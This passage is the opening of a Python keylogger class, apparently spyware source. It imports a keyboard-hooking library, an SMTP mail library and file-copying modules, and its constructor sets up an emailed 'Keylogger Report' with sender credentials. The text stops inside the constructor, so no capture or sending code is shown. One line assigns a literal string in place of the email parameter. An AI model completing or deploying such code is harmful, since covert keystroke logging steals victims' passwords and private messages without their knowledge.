import pynput.keyboard
import smtplib
import threading
import os
import shutil


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.logger = "[Keylogger Initiated]"
        self.subject = "Keylogger Report Email"
        self.email = "email"